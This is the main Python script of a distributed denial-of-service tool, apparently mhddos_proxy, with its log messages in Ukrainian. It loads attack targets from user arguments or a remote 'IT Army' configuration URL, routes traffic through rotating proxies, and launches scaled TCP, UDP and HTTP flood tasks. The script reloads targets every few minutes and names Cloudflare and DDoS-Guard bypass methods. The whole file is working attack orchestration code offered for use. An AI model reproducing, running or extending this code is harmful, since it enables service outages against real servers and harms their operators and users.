# @formatter:off
import colorama; colorama.init()
# @formatter:on
import asyncio
import time
from threading import Event, Thread
from typing import List, Optional, Union

from src.cli import init_argparse
from src.concurrency import safe_run
from src.core import (
    logger, cl, Stats,
    LOW_RPC, IT_ARMY_CONFIG_URL, REFRESH_RATE, ONLY_MY_IP,
    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS,
)
from src.dns_utils import resolve_all_targets
from src.mhddos import main as mhddos_main, AsyncTcpFlood, AsyncUdpFlood, AttackSettings
from src.output import show_statistic, print_banner
from src.proxies import ProxySet
from src.system import fix_ulimits, is_latest_version
from src.targets import Target, TargetsLoader


AsyncFlood = Union[AsyncTcpFlood, AsyncUdpFlood]


class FloodTask:

    def __init__(self, runnable: AsyncFlood, scale: int = 1):
        self._runnable = runnable
        self._scale = scale
        self._failure_budget = scale * FAILURE_BUDGET_FACTOR
        self._failure_budget_delay = FAILURE_DELAY_SECONDS

    def _launch_task(self) -> asyncio.Task:
        return asyncio.create_task(safe_run(self._runnable.run))

    async def loop(self) -> None:
        tasks = set(self._launch_task() for _ in range(self._scale))
        num_failures = 0
        while tasks:
            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            for f in done:
                num_failures += int(not f.result())
                if num_failures >= self._failure_budget:
                    await asyncio.sleep(self._failure_budget_delay)
                    num_failures = 0
                pending.add(self._launch_task())
            tasks = pending


async def run_ddos(
    proxies: ProxySet,
    targets_loader: TargetsLoader,
    attack_settings: AttackSettings,
    reload_after: int,
    http_methods: List[str],
    debug: bool,
    table: bool,
    total_threads: int,
    use_my_ip: int,
):
    loop = asyncio.get_event_loop()
    statistics = {}

    # initial set of proxies
    if proxies.has_proxies:
        num_proxies = await proxies.reload()
        if num_proxies == 0:
            logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
            exit()

    def prepare_flooder(target: Target, method: str) -> AsyncFlood:
        thread_statistics = Stats()
        sig = target.options_repr
        statistics[(target, method, sig)] = thread_statistics
        if target.has_options:
            target_rpc = int(target.option("rpc", "0"))
            settings = attack_settings.with_options(
                requests_per_connection=target_rpc if target_rpc > 0 else None,
                low_level_transport=(target.option("transport", "stream") == "sock")
            )
        else:
            settings = attack_settings

        kwargs = {
            'url': target.url,
            'ip': target.addr,
            'method': method,
            'event': None,
            'stats': thread_statistics,
            'proxies': proxies,
            'loop': loop,
            'settings': settings,
        }
        if not (table or debug):
            logger.info(
                f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                % (target.url.host, target.url.port, method)
            )
        return mhddos_main(**kwargs)

    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
    if not (table or debug):
        # Keep the docs/info on-screen for some time before outputting the logger.info above
        await asyncio.sleep(5)

    active_flooder_tasks = []

    async def load_targets():
        targets, changed = await targets_loader.load()
        targets = await resolve_all_targets(targets)
        return [target for target in targets if target.is_resolved], changed

    async def install_targets(targets):
        # cancel running flooders
        if active_flooder_tasks:
            for task in active_flooder_tasks:
                task.cancel()
            active_flooder_tasks.clear()

        statistics.clear()

        tcp_flooders, udp_flooders = [], []
        for target in targets:
            assert target.is_resolved, "Unresolved target cannot be used for attack"
            # udp://, method defaults to "UDP"
            if target.is_udp:
                udp_flooders.append(prepare_flooder(target, target.method or 'UDP'))
            # Method is given explicitly
            elif target.method is not None:
                tcp_flooders.append(prepare_flooder(target, target.method))
            # tcp://
            elif target.url.scheme == "tcp":
                tcp_flooders.append(prepare_flooder(target, 'TCP'))
            # HTTP(S), methods from --http-methods
            elif target.url.scheme in {"http", "https"}:
                for method in http_methods:
                    tcp_flooders.append(prepare_flooder(target, method))
            else:
                logger.error(f"Unsupported scheme given: {target.url.scheme}")

        num_tcp = len(tcp_flooders)
        scale = max(1, (total_threads // num_tcp) if num_tcp > 0 else 0)

        for flooder in tcp_flooders:
            task = asyncio.create_task(FloodTask(flooder, scale).loop())
            # XXX: add stats for running/cancelled tasks with add_done_callback
            active_flooder_tasks.append(task)
        
        for flooder in udp_flooders:
            task = asyncio.create_task(FloodTask(flooder).loop())
            active_flooder_tasks.append(task)

    try:
        initial_targets, _ = await load_targets()
    except Exception as exc:
        logger.error(f"{cl.RED}Завнтаження цілей завершилося помилкою: {exc}{cl.RESET}")
        initial_targets = []

    if not initial_targets:
        logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
        exit()
    await install_targets(initial_targets)

    tasks = []

    async def stats_printer():
        cycle_start = time.perf_counter()
        while True:
            await asyncio.sleep(REFRESH_RATE)
            try:
                passed = time.perf_counter() - cycle_start
                num_proxies = len(proxies)
                show_statistic(
                    statistics,
                    REFRESH_RATE,
                    table,
                    num_proxies,
                    None if targets_loader.age is None else reload_after-int(targets_loader.age),
                    use_my_ip,
                )
            finally:
                cycle_start = time.perf_counter()

    # setup coroutine to print stats
    tasks.append(asyncio.ensure_future(stats_printer()))

    async def reload_targets(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                targets, changed = await load_targets()
                if not targets:
                    logger.warning(
                        f"{cl.RED}Не знайдено жодної доступної цілі - "
                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                    )
                elif not changed:
                    logger.warning(
                        f"{cl.YELLOW}Перелік цілей не змінився - "
                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                    )
                else:
                    await install_targets(targets)
            except asyncio.CancelledError as e:
                raise e
            except Exception as exc:
                logger.warning(
                    f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей: {exc}{cl.RESET}")
            finally:
                logger.info(
                    f"{cl.YELLOW}Оновлення цілей через: "
                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
                )

    # setup coroutine to reload targets (if configuration file is given)
    if targets_loader.dynamic:
        tasks.append(asyncio.ensure_future(reload_targets(delay_seconds=reload_after)))

    async def reload_proxies(delay_seconds: int = 30):
        while True:
            try:
                await asyncio.sleep(delay_seconds)
                num_proxies = await proxies.reload()
                if num_proxies == 0:
                    logger.warning(
                        f"{cl.MAGENTA}Буде використано попередній список проксі{cl.RESET}")
            except asyncio.CancelledError as e:
                raise e
            except Exception:
                pass
            finally:
                logger.info(
                    f"{cl.YELLOW}Оновлення проксей через: "
                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
                )

    # setup coroutine to reload proxies
    if proxies is not None:
        tasks.append(asyncio.ensure_future(reload_proxies(delay_seconds=reload_after)))

    await asyncio.gather(*tasks, return_exceptions=True)


async def start(args, shutdown_event: Event):
    use_my_ip = min(args.use_my_ip, ONLY_MY_IP)
    print_banner(use_my_ip)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(f'{cl.RED}Робота методу {bypass} не гарантована{cl.RESET}')

    if args.rpc < LOW_RPC:
        logger.warning(
            f'{cl.YELLOW}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
            f'через збільшення кількості перепідключень{cl.RESET}')

    is_old_version = not await is_latest_version()
    if is_old_version:
        logger.warning(
            f"{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: "
            "https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n"
        )

    if args.itarmy:
        targets_loader = TargetsLoader([], IT_ARMY_CONFIG_URL)
    else:
        targets_loader = TargetsLoader(args.targets, args.config)

    # we are going to fetch proxies even in case we have only UDP
    # targets because the list of targets might change at any point in time
    proxies = ProxySet(args.proxies, use_my_ip)

    attack_settings = AttackSettings(
        requests_per_connection=args.rpc,
        low_level_transport=False,
        drain_timeout_seconds=0.1,
    )

    # XXX: with the current implementation there's no need to
    # have 2 separate functions to setups params for launching flooders
    reload_after = 300
    await run_ddos(
        proxies,
        targets_loader,
        attack_settings,
        reload_after,
        args.http_methods,
        args.debug,
        args.table,
        args.threads,
        use_my_ip,
    )
    shutdown_event.set()


if __name__ == '__main__':
    args = init_argparse().parse_args()

    if args.advanced_allow_uvloop:
        try:
            __import__("uvloop").install()
            logger.info(
                f"{cl.GREEN}'uvloop' успішно активований "
                f"(підвищенна ефективність роботи з мережею){cl.RESET}")
        except:
            logger.warning(
                f"{cl.MAGENTA}Вказано ключ '--advanced-allow-uvloop' "
                f"проте 'uvloop' бібліотека не встановлена.{cl.RESET} "
                f"{cl.YELLOW}Атака буде проведенна з використанням вбудобваних систем.{cl.RESET}")

    shutdown_event = Event()
    try:
        # run event loop in a separate thread to ensure the application
        # exists immediately after Ctrl+C
        Thread(target=lambda: asyncio.run(start(args, shutdown_event)), daemon=True).start()
        # we can do something smarter rather than waiting forever,
        # but as of now it's gonna be consistent with previous version
        shutdown_event.wait()
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
